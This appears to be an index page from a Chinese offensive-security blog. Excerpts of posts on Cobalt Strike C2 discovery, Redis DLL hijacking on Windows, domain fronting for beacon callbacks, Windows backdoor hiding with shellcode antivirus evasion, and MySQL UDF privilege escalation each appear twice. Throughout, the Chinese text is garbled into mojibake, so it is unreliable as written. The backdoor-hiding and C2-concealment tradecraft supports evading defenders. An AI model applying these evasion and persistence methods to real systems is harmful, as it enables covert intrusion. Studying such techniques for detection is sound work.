		<h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>åœ¨githubä¸Šé¢å‡ºç°ä¸€ä¸ªä»“åº“åˆ†æ<code>CobaltStrike</code>ç›‘å¬ç«¯å£çš„ç‰¹å¾ï¼š<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>ã€‚CSåœ¨ç›‘å¬Stagerç«¯å£çš„æ—¶å€™ï¼Œä¼šé€šè¿‡URIä¸‹è½½Payloadæ‰§è¡Œï¼Œè¿™ä¸ªURIç”Ÿæˆçš„è§„åˆ™ç”Ÿæˆï¼š</p>
<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
<h3 id="æ‰¾åˆ°DomainFront"><a href="#æ‰¾åˆ°DomainFront" class="headerlink" title="æ‰¾åˆ°DomainFront"></a>æ‰¾åˆ°DomainFront</h3><p>æ ¹æ®360çš„ç©ºé—´æµ‹ç»˜ï¼Œçœ‹å®Œä¹‹åç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯é€šè¿‡fofaè¿™ç±»ç©ºé—´æµ‹ç»˜æ‰¾å‡ºç‰¹å¾ï¼Œç„¶åæ‰¾å‡ºæ¥è®¾ç½®äº†DomainFrontçš„C2ï¼Œæƒ³çœ‹çœ‹è¿™äº›C2<br>çš„åŸå§‹åŸŸåå’Œè®¾ç½®C2çš„åŸŸåæ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¤§å®¶éƒ½ç”¨çš„ä»€ä¹ˆä½œä¸ºåŸŸåå‰ç½®çš„ :)</p>
<h4 id="Quakeæµ‹ç»˜"><a href="#Quakeæµ‹ç»˜" class="headerlink" title="Quakeæµ‹ç»˜"></a>Quakeæµ‹ç»˜</h4><p>æ ¹æ®360ç»™å‡ºçš„æœç´¢æ¡ä»¶ï¼Œå…ˆæ‰¾å‡ºæ¥ä¸€æ‰¹IPåœ°å€:</p>
<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="ä¿®æ”¹è„šæœ¬"><a href="#ä¿®æ”¹è„šæœ¬" class="headerlink" title="ä¿®æ”¹è„šæœ¬"></a>ä¿®æ”¹è„šæœ¬</h4><p>ä¿®æ”¹å¥½ä¹‹åçš„è„šæœ¬å’Œæ‰«æç»“æœ:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>ã€‚æŠŠå•çº¿ç¨‹æ”¹ä¸ºå¤šçº¿ç¨‹ï¼Œå†å¢åŠ ä¸€ä¸ªè·å–IPçš„httpsè¯ä¹¦åŸŸåå‡½æ•°ï¼š</p>
	

	</div>
  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>åœ¨githubä¸Šé¢å‡ºç°ä¸€ä¸ªä»“åº“åˆ†æ<code>CobaltStrike</code>ç›‘å¬ç«¯å£çš„ç‰¹å¾ï¼š<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>ã€‚CSåœ¨ç›‘å¬Stagerç«¯å£çš„æ—¶å€™ï¼Œä¼šé€šè¿‡URIä¸‹è½½Payloadæ‰§è¡Œï¼Œè¿™ä¸ªURIç”Ÿæˆçš„è§„åˆ™ç”Ÿæˆï¼š</p>
<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
<h3 id="æ‰¾åˆ°DomainFront"><a href="#æ‰¾åˆ°DomainFront" class="headerlink" title="æ‰¾åˆ°DomainFront"></a>æ‰¾åˆ°DomainFront</h3><p>æ ¹æ®360çš„ç©ºé—´æµ‹ç»˜ï¼Œçœ‹å®Œä¹‹åç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯é€šè¿‡fofaè¿™ç±»ç©ºé—´æµ‹ç»˜æ‰¾å‡ºç‰¹å¾ï¼Œç„¶åæ‰¾å‡ºæ¥è®¾ç½®äº†DomainFrontçš„C2ï¼Œæƒ³çœ‹çœ‹è¿™äº›C2<br>çš„åŸå§‹åŸŸåå’Œè®¾ç½®C2çš„åŸŸåæ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¤§å®¶éƒ½ç”¨çš„ä»€ä¹ˆä½œä¸ºåŸŸåå‰ç½®çš„ :)</p>
<h4 id="Quakeæµ‹ç»˜"><a href="#Quakeæµ‹ç»˜" class="headerlink" title="Quakeæµ‹ç»˜"></a>Quakeæµ‹ç»˜</h4><p>æ ¹æ®360ç»™å‡ºçš„æœç´¢æ¡ä»¶ï¼Œå…ˆæ‰¾å‡ºæ¥ä¸€æ‰¹IPåœ°å€:</p>
<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="ä¿®æ”¹è„šæœ¬"><a href="#ä¿®æ”¹è„šæœ¬" class="headerlink" title="ä¿®æ”¹è„šæœ¬"></a>ä¿®æ”¹è„šæœ¬</h4><p>ä¿®æ”¹å¥½ä¹‹åçš„è„šæœ¬å’Œæ‰«æç»“æœ:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>ã€‚æŠŠå•çº¿ç¨‹æ”¹ä¸ºå¤šçº¿ç¨‹ï¼Œå†å¢åŠ ä¸€ä¸ªè·å–IPçš„httpsè¯ä¹¦åŸŸåå‡½æ•°ï¼š</p>
	
	</div>
  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/09/10/redis-windows-hijack.html" >Redis On Windows -- Dll Hijack</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-09-10  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡æµ‹è¯•äº†Redisåœ¨Windowså¹³å°ä¸‹çš„dllåŠ«æŒï¼Œä¸»è¦å‚è€ƒæ–‡ç« æ˜¯å…ˆçŸ¥çš„ç§‹æ°´å¸ˆå‚…: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153">Redis on Windows å‡ºç½‘åˆ©ç”¨æ¢ç´¢</a></p>
<h3 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100
Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="å¯åŠ«æŒçš„DLL"><a href="#å¯åŠ«æŒçš„DLL" class="headerlink" title="å¯åŠ«æŒçš„DLL"></a>å¯åŠ«æŒçš„DLL</h3><p>æŒ‰ç…§æ–‡ç« ä¸­ä½¿ç”¨<code>Process Monitor</code>ï¼Œåœ¨ä½¿ç”¨<code>redis-cli</code>æ“ä½œçš„æ—¶å€™ï¼Œè§‚å¯Ÿç¼ºå¤±çš„DLLã€‚åœ¨<code>Process Monitor Filter</code>é‡Œé¢è®¾ç½®<code>Image Path</code>çš„å€¼ä¸º<code>redis-server.exe</code>çš„è·¯å¾„ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯<code>C:\Program Files\Redis\redis-server.exe</code>ï¼Œ<code>Path</code>è®¾ç½®ä¸º<code>ends with dll</code>ã€‚è®¾ç½®å¥½ä¹‹åï¼Œä½¿ç”¨<code>redis-cli</code>è¿æ¥ï¼Œæ‰§è¡Œ<code>bgsave</code>å‘½ä»¤ï¼Œç„¶åè§‚å¯Ÿç¼ºå¤±çš„dllï¼Œæœ‰å¦‚ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<p>å½“<code>redis-server.exe</code>å¯åŠ¨çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll
C:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<p>æ‰§è¡Œ<code>BGREWRITEAOF</code>çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2020/09/10/redis-windows-hijack.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡æµ‹è¯•äº†Redisåœ¨Windowså¹³å°ä¸‹çš„dllåŠ«æŒï¼Œä¸»è¦å‚è€ƒæ–‡ç« æ˜¯å…ˆçŸ¥çš„ç§‹æ°´å¸ˆå‚…: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153">Redis on Windows å‡ºç½‘åˆ©ç”¨æ¢ç´¢</a></p>
<h3 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100
Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="å¯åŠ«æŒçš„DLL"><a href="#å¯åŠ«æŒçš„DLL" class="headerlink" title="å¯åŠ«æŒçš„DLL"></a>å¯åŠ«æŒçš„DLL</h3><p>æŒ‰ç…§æ–‡ç« ä¸­ä½¿ç”¨<code>Process Monitor</code>ï¼Œåœ¨ä½¿ç”¨<code>redis-cli</code>æ“ä½œçš„æ—¶å€™ï¼Œè§‚å¯Ÿç¼ºå¤±çš„DLLã€‚åœ¨<code>Process Monitor Filter</code>é‡Œé¢è®¾ç½®<code>Image Path</code>çš„å€¼ä¸º<code>redis-server.exe</code>çš„è·¯å¾„ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯<code>C:\Program Files\Redis\redis-server.exe</code>ï¼Œ<code>Path</code>è®¾ç½®ä¸º<code>ends with dll</code>ã€‚è®¾ç½®å¥½ä¹‹åï¼Œä½¿ç”¨<code>redis-cli</code>è¿æ¥ï¼Œæ‰§è¡Œ<code>bgsave</code>å‘½ä»¤ï¼Œç„¶åè§‚å¯Ÿç¼ºå¤±çš„dllï¼Œæœ‰å¦‚ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<p>å½“<code>redis-server.exe</code>å¯åŠ¨çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll
C:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<p>æ‰§è¡Œ<code>BGREWRITEAOF</code>çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2020/09/10/redis-windows-hijack.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/08/28/CloudFront-Https.html" >Domain Frontingéšè—HTTPS</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-08-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>è®°å½•ä¸€ä¸‹å½“ä½¿ç”¨<code>Domain Fronting</code>ä¸­ä½¿ç”¨<code>https</code>æ¥ä¸Šçº¿æ—¶å€™çš„å‘ï¼Œå› ä¸ºæŸ¥äº†åŠåœˆæ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„èµ„æ–™ï¼Œä¸ºå•¥éè¦httpså‘¢ï¼Œå› ä¸º<code>node32</code>å¯¹httpçš„æµé‡å¾ˆæ•æ„Ÿã€‚</p>
<p>###ç›®æ ‡</p>
<ol>
<li>ä½¿ç”¨<code>Windows/beacon_https/reverse_https</code>ä½œä¸ºä¸Šçº¿çš„payload</li>
<li>AWSçš„<code>Cloudfront</code>ä½œä¸ºå‰ç½®åŸŸå</li>
</ol>
<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><pre class="line-numbers language-none"><code class="language-none">åŸŸå: example.com
VPS(Centos)
cloudflare(åªä½œåŸŸåè§£æ,ä¸æ·»åŠ ä»»ä½•å…¶ä»–åŠŸèƒ½ï¼Œä¸åŠ CDNï¼Œä¸åŠ HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<h2 id="éƒ¨ç½²å·¥ä½œ"><a href="#éƒ¨ç½²å·¥ä½œ" class="headerlink" title="éƒ¨ç½²å·¥ä½œ"></a>éƒ¨ç½²å·¥ä½œ</h2><p>å®‰è£…çš„apacheæ˜¯æµ‹è¯•è¿é€šæ€§ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä»»ä½•ç”¨å¤„ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">yum install httpd
systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="å¢åŠ apacheé…ç½®æ–‡ä»¶"><a href="#å¢åŠ apacheé…ç½®æ–‡ä»¶" class="headerlink" title="å¢åŠ apacheé…ç½®æ–‡ä»¶"></a>å¢åŠ apacheé…ç½®æ–‡ä»¶</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
&lt;VirtualHost *:80&gt;
   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
   ServerName example.com


RewriteEngine on
RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>è®°å½•ä¸€ä¸‹å½“ä½¿ç”¨<code>Domain Fronting</code>ä¸­ä½¿ç”¨<code>https</code>æ¥ä¸Šçº¿æ—¶å€™çš„å‘ï¼Œå› ä¸ºæŸ¥äº†åŠåœˆæ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„èµ„æ–™ï¼Œä¸ºå•¥éè¦httpså‘¢ï¼Œå› ä¸º<code>node32</code>å¯¹httpçš„æµé‡å¾ˆæ•æ„Ÿã€‚</p>
<p>###ç›®æ ‡</p>
<ol>
<li>ä½¿ç”¨<code>Windows/beacon_https/reverse_https</code>ä½œä¸ºä¸Šçº¿çš„payload</li>
<li>AWSçš„<code>Cloudfront</code>ä½œä¸ºå‰ç½®åŸŸå</li>
</ol>
<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><pre class="line-numbers language-none"><code class="language-none">åŸŸå: example.com
VPS(Centos)
cloudflare(åªä½œåŸŸåè§£æ,ä¸æ·»åŠ ä»»ä½•å…¶ä»–åŠŸèƒ½ï¼Œä¸åŠ CDNï¼Œä¸åŠ HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<h2 id="éƒ¨ç½²å·¥ä½œ"><a href="#éƒ¨ç½²å·¥ä½œ" class="headerlink" title="éƒ¨ç½²å·¥ä½œ"></a>éƒ¨ç½²å·¥ä½œ</h2><p>å®‰è£…çš„apacheæ˜¯æµ‹è¯•è¿é€šæ€§ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä»»ä½•ç”¨å¤„ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">yum install httpd
systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="å¢åŠ apacheé…ç½®æ–‡ä»¶"><a href="#å¢åŠ apacheé…ç½®æ–‡ä»¶" class="headerlink" title="å¢åŠ apacheé…ç½®æ–‡ä»¶"></a>å¢åŠ apacheé…ç½®æ–‡ä»¶</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
&lt;VirtualHost *:80&gt;
   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
   ServerName example.com


RewriteEngine on
RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/08/28/hide-your-windows-backdoor.html" >Windowsåé—¨éšè—</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-08-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="åé—¨çš„æ„æˆ"><a href="#åé—¨çš„æ„æˆ" class="headerlink" title="åé—¨çš„æ„æˆ"></a>åé—¨çš„æ„æˆ</h3><p>åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:</p>
<ol>
<li>shellcodeçš„åˆ†ç¦»å…æ€</li>
<li>C2æœåŠ¡å™¨çš„éšè—</li>
<li>Windowsåé—¨çš„è®¾ç½®</li>
</ol>
<h3 id="åˆ†ç¦»å…æ€"><a href="#åˆ†ç¦»å…æ€" class="headerlink" title="åˆ†ç¦»å…æ€"></a>åˆ†ç¦»å…æ€</h3><p>shellcodeçš„åˆ†ç¦»å…æ€æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡ŒæŠŠæ¯ä¸ªæ¨¡å—æ‹¿å‡ºæ¥å°±æ˜¯å¦‚ä¸‹çš„å‡ ä¸ª:</p>
<ol>
<li>é€šä¿¡: <code>socket</code>,<code>http</code></li>
<li><code>shellcode</code>çš„æ‰§è¡Œæ–¹å¼</li>
<li><code>shellcode</code>çš„æµé‡</li>
<li>è¿œç¨‹æœåŠ¡å™¨çš„éšè—</li>
</ol>
<p>é™¤å»ç¬¬äºŒç§æ–¹å¼æœ‰å¾ˆå¤šç§å¯ä»¥æ‰§è¡Œshellcodeçš„ï¼Œå…¶ä»–ä¸‰ç§æœ€å¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯å®ç”¨<code>Domain Fronting</code>éšè—æœåŠ¡å™¨ï¼ŒAESåŠ¨æ€åŠ å¯†è§£å¯†è¿è¡Œshellcodeã€‚è¿™æ ·å­æ—¢éšè—äº†æœåŠ¡å™¨ï¼Œåˆé¿å…shellcodeçš„æ˜æ–‡æµé‡è¢«æ¢æµ‹åˆ°ã€‚å½“ç„¶ä¸Šçº¿ä¹‹åçš„æ“ä½œè¢«æ¢æµ‹ä¸åœ¨è¢«è®¨è®ºçš„èŒƒå›´ä¹‹å†…ã€‚</p>
<p>åœ¨å‚è€ƒèµ„æ–™é‡Œé¢,<code>uknownsec</code>å·²ç»æŠŠä¸»è¦çš„ä»£ç æ”¾å‡ºæ¥äº†ã€‚åªéœ€è¦æ‹¿å‡ºæ¥æ‹¼å‡‘ä¸€ä¸‹å°±å¯ä»¥é£Ÿç”¨ã€‚</p>
<p>å…¶ä¸­æœåŠ¡ç«¯å‡ºå»pythonçš„åŠŸèƒ½ä¹‹å¤–ï¼Œå¯ä»¥ç»™è‡ªå·±åŠ ä¸Šä¸€ä¸ª<code>slack</code>æœºå™¨äººçš„é€šçŸ¥ï¼Œè¿™æ ·å­ä¸Šçº¿çš„æ—¶å€™å°±æœ‰é€šçŸ¥ã€‚</p>
<h4 id="C2æœåŠ¡å™¨çš„éšè—"><a href="#C2æœåŠ¡å™¨çš„éšè—" class="headerlink" title="C2æœåŠ¡å™¨çš„éšè—"></a>C2æœåŠ¡å™¨çš„éšè—</h4>
	

	</div>
  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="åé—¨çš„æ„æˆ"><a href="#åé—¨çš„æ„æˆ" class="headerlink" title="åé—¨çš„æ„æˆ"></a>åé—¨çš„æ„æˆ</h3><p>åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:</p>
<ol>
<li>shellcodeçš„åˆ†ç¦»å…æ€</li>
<li>C2æœåŠ¡å™¨çš„éšè—</li>
<li>Windowsåé—¨çš„è®¾ç½®</li>
</ol>
<h3 id="åˆ†ç¦»å…æ€"><a href="#åˆ†ç¦»å…æ€" class="headerlink" title="åˆ†ç¦»å…æ€"></a>åˆ†ç¦»å…æ€</h3><p>shellcodeçš„åˆ†ç¦»å…æ€æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡ŒæŠŠæ¯ä¸ªæ¨¡å—æ‹¿å‡ºæ¥å°±æ˜¯å¦‚ä¸‹çš„å‡ ä¸ª:</p>
<ol>
<li>é€šä¿¡: <code>socket</code>,<code>http</code></li>
<li><code>shellcode</code>çš„æ‰§è¡Œæ–¹å¼</li>
<li><code>shellcode</code>çš„æµé‡</li>
<li>è¿œç¨‹æœåŠ¡å™¨çš„éšè—</li>
</ol>
<p>é™¤å»ç¬¬äºŒç§æ–¹å¼æœ‰å¾ˆå¤šç§å¯ä»¥æ‰§è¡Œshellcodeçš„ï¼Œå…¶ä»–ä¸‰ç§æœ€å¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯å®ç”¨<code>Domain Fronting</code>éšè—æœåŠ¡å™¨ï¼ŒAESåŠ¨æ€åŠ å¯†è§£å¯†è¿è¡Œshellcodeã€‚è¿™æ ·å­æ—¢éšè—äº†æœåŠ¡å™¨ï¼Œåˆé¿å…shellcodeçš„æ˜æ–‡æµé‡è¢«æ¢æµ‹åˆ°ã€‚å½“ç„¶ä¸Šçº¿ä¹‹åçš„æ“ä½œè¢«æ¢æµ‹ä¸åœ¨è¢«è®¨è®ºçš„èŒƒå›´ä¹‹å†…ã€‚</p>
<p>åœ¨å‚è€ƒèµ„æ–™é‡Œé¢,<code>uknownsec</code>å·²ç»æŠŠä¸»è¦çš„ä»£ç æ”¾å‡ºæ¥äº†ã€‚åªéœ€è¦æ‹¿å‡ºæ¥æ‹¼å‡‘ä¸€ä¸‹å°±å¯ä»¥é£Ÿç”¨ã€‚</p>
<p>å…¶ä¸­æœåŠ¡ç«¯å‡ºå»pythonçš„åŠŸèƒ½ä¹‹å¤–ï¼Œå¯ä»¥ç»™è‡ªå·±åŠ ä¸Šä¸€ä¸ª<code>slack</code>æœºå™¨äººçš„é€šçŸ¥ï¼Œè¿™æ ·å­ä¸Šçº¿çš„æ—¶å€™å°±æœ‰é€šçŸ¥ã€‚</p>
<h4 id="C2æœåŠ¡å™¨çš„éšè—"><a href="#C2æœåŠ¡å™¨çš„éšè—" class="headerlink" title="C2æœåŠ¡å™¨çš„éšè—"></a>C2æœåŠ¡å™¨çš„éšè—</h4>
	
	</div>
  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/07/29/mysql-UDF.html" >MySql UDFææƒæ³¨æ„äº‹é¡¹</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-07-29  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSFçš„dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
</blockquote>
<h3 id="0x01-å‡†å¤‡å·¥ä½œ"><a href="#0x01-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01 å‡†å¤‡å·¥ä½œ"></a>0x01 å‡†å¤‡å·¥ä½œ</h3><p>å…ˆæ£€æŸ¥è¿è¡Œçš„mysqlç»“æ„:</p>
<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç»“æœå¦‚ä¸‹:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
+----------------------+---------------------------+
<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
+----------------------+---------------------------+
<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
+----------------------+---------------------------+
MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
+-------------------------+--------+
<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
+-------------------------+--------+
<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>Mysql 5.0.67</code>ç‰ˆæœ¬å¼€å§‹ï¼ŒUDFçš„æ–‡ä»¶å¿…é¡»æ”¾åœ¨mysqlçš„æ’ä»¶ç›®å½•: <code>select @@plugin_dir;</code></p>
<p>å¯ä»¥åœ¨å¼€å¯mysqlçš„æ—¶å€™è®¾ç½®pluginçš„ç›®å½•:</p>
<pre class="line-numbers language-none"><code class="language-none">æŒ‡å®šç›®å½•:
mysqld.exe â€“plugin-dir&#x3D;C:\\temp\\plugins\\

æŒ‡å®šé…ç½®æ–‡ä»¶:
mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini

é…ç½®æ–‡ä»¶åŒ…æ‹¬å¦‚ä¸‹å†…å®¹:
[mysqld]
plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è€ç‰ˆæœ¬çš„Mysqlæœç´¢UDFè·¯å¾„æ˜¯æŒ‰ç…§å¦‚ä¸‹çš„é¡ºåºæ¥çš„:</p>
	

	</div>
  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
